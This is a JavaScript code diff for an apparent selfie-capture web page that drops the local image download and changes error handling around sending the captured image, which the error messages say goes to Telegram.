@@ -515,32 +515,20 @@ function captureImage() {
         },
         body: JSON.stringify({ image: dataURL })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            // Also trigger a browser download
-            downloadImage(dataURL, data.fileName);
+    .then(response => response.json().then(data => ({ ok: response.ok, data })))
+    .then(({ ok, data }) => {
+        if (ok && data.success) {
             showResult(dataURL);
         } else {
-            showError("Gagal menyimpan gambar", "Silakan coba lagi.");
-            resetState();
+            throw new Error(data.error || "Gagal mengirim ke Telegram");
         }
     })
     .catch(error => {
-        console.error("Error saving image:", error);
-        // Fallback: still show result and offer download even if API fails
-        downloadImage(dataURL, `selfie_${Date.now()}.png`);
-        showResult(dataURL);
+        console.error("Error sending image:", error);
+        showError("Gagal mengirim ke Telegram", "Silakan coba lagi.");
+        isCapturing = false;
+        isSuccess = false;
     });
-}
-
-function downloadImage(dataURL, fileName) {
-    const link = document.createElement('a');
-    link.href = dataURL;
-    link.download = fileName;
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
 }
 
 function showResult(imageSrc) {
